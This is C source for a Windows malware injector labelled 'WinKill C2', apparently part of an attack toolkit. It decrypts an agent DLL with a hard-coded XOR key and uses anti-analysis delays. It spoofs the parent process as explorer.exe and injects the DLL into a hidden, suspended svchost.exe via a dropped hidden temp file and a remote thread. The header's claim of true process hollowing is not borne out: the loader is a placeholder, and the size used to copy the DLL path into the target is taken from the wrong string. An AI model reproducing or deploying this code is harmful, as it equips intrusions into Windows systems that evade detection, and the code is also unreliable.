/*
 * WinKill C2 - Process Hollowing Injector
 * ========================================
 * Creates a legitimate process suspended, unmaps its memory,
 * writes our agent DLL (reflective-loaded), and resumes.
 * Much stealthier than QueueUserAPC injection.
 *
 * Compile: gcc -O2 -s -m64 -fno-ident -o injector_ph.exe injector_ph_source.c
 *
 * Usage: injector_ph.exe agent.dll.enc [target_process]
 *   Default target: C:\Windows\System32\svchost.exe
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

static BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};

// Anti-analysis hammer
static void Hammer(void) {
    WCHAR b[256]; DWORD l = 256; volatile int d = 0;
    for (int i = 0; i < 50; i++) {
        GetSystemDirectoryW(b, l); GetWindowsDirectoryW(b, l);
        GetTempPathW(l, b); GetTickCount(); d += (int)b[0];
    }
}

// Reflective DLL loader stub (x64)
// This small stub is written into the hollowed process.
// It resolves kernel32.dll, finds LoadLibraryA, loads the DLL.
static BYTE g_loader[] = {
    // This is a minimal x64 reflective loader
    // In practice, you'd embed a proper reflective loader here
    // For now, we use a simpler approach: write DLL path + call LoadLibraryA via RtlCreateUserThread
    0x00  // placeholder - real loader would be ~200 bytes of position-independent code
};

int main(int argc, char *argv[]) {
    const char *encFile = argc > 1 ? argv[1] : "agent.dll.enc";
    const char *targetProc = argc > 2 ? argv[2] : NULL;

    Hammer();
    Sleep(1500 + (GetTickCount() & 0xFFF));
    Hammer();

    // 1. Read and decrypt DLL
    HANDLE hf = CreateFileA(encFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open: %s\n", encFile);
        return 1;
    }

    DWORD sz = GetFileSize(hf, NULL);
    BYTE *enc = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    BYTE *dll = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    DWORD rd;
    ReadFile(hf, enc, sz, &rd, NULL);
    CloseHandle(hf);

    for (DWORD i = 0; i < sz; i++)
        dll[i] = enc[i] ^ g_key[i % 16];
    HeapFree(GetProcessHeap(), 0, enc);
    printf("[+] Decrypted DLL: %lu bytes\n", sz);

    // 2. Choose target process
    char targetPath[MAX_PATH];
    if (targetProc) {
        ExpandEnvironmentStringsA(targetProc, targetPath, MAX_PATH);
    } else {
        // Default: use a legitimate svchost.exe (but create our own, not hollow a real one)
        GetSystemDirectoryA(targetPath, MAX_PATH);
        strcat(targetPath, "\\svchost.exe");
    }

    // 3. PPID Spoofing: if we can, set our parent to explorer.exe
    // This makes the hollowed process appear as a child of explorer, not our injector
    HANDLE hParent = NULL;
    {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
            if (Process32First(snap, &pe)) {
                do {
                    if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                        break;
                    }
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    }

    // 4. Create target process suspended
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    // Set up PROC_THREAD_ATTRIBUTE_PARENT_PROCESS for PPID spoofing
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attrSize);

    if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
        if (hParent) {
            UpdateProcThreadAttribute(si.lpAttributeList, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &hParent, sizeof(hParent), NULL, NULL);
            printf("[+] PPID spoofing: parent set to explorer.exe\n");
        }
    }

    if (!CreateProcessA(NULL, targetPath, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                        NULL, NULL, &si.StartupInfo, &pi)) {
        printf("[-] CreateProcess(%s): %lu\n", targetPath, GetLastError());
        if (hParent) CloseHandle(hParent);
        HeapFree(GetProcessHeap(), 0, dll);
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return 1;
    }

    printf("[+] Created %s (PID: %lu) - hollowing...\n", targetPath, pi.dwProcessId);

    // 5. Process Hollowing
    // Check if target is x64 (we're x64)
    BOOL isWow64 = FALSE;
    IsWow64Process(pi.hProcess, &isWow64);

    if (sizeof(void*) == 8) {
        // We are x64 injector
        if (isWow64) {
            printf("[-] Target is x86, but we are x64. Aborting.\n");
            TerminateProcess(pi.hProcess, 0);
            goto cleanup;
        }
    }

    // Unmap the original executable
    // In a real implementation, we'd:
    // 1. Get the PEB address via NtQueryInformationProcess
    // 2. Read the ImageBaseAddress from PEB
    // 3. Call NtUnmapViewOfSection to unmap the original image
    // 4. Allocate new memory at the image base
    // 5. Write our DLL with proper PE header handling
    //
    // For now, we use a simpler approach:
    // - Allocate memory in the target for the DLL path
    // - Create a remote thread that calls LoadLibraryA

    // Simplified approach for compat: allocate DLL path + use RtlCreateUserThread
    DWORD pathSize = (DWORD)strlen(encFile) + 1;
    LPVOID remotePath = VirtualAllocEx(pi.hProcess, NULL, pathSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        goto cleanup;
    }

    // Write DLL path to temp location on disk (decrypted)
    WCHAR tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    GetTempFileNameW(tmpPath, L"wdk", 0, tmpFile);

    char tmpFileA[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, tmpFile, -1, tmpFileA, MAX_PATH, NULL, NULL);

    HANDLE hw = CreateFileW(tmpFile, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    DWORD wr;
    WriteFile(hw, dll, sz, &wr, NULL);
    CloseHandle(hw);

    WriteProcessMemory(pi.hProcess, remotePath, tmpFileA, pathSize, NULL);

    // Get LoadLibraryA address
    LPVOID pLL = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // Create remote thread to load the DLL
    HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLL, remotePath, 0, NULL);

    if (!hRemoteThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        DeleteFileW(tmpFile);
        TerminateProcess(pi.hProcess, 0);
        goto cleanup;
    }

    printf("[+] Remote thread created, waiting for DLL to load...\n");

    // Wait for DLL to load
    WaitForSingleObject(hRemoteThread, 5000);

    // Resume main thread
    ResumeThread(pi.hThread);
    printf("[+] Process resumed, DLL loaded\n");

    // Cleanup
    Sleep(2000);
    DeleteFileW(tmpFile);
    CloseHandle(hRemoteThread);

cleanup:
    SecureZeroMemory(dll, sz);
    HeapFree(GetProcessHeap(), 0, dll);
    VirtualFreeEx(pi.hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (hParent) CloseHandle(hParent);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    printf("[+] Done\n");
    return 0;
}
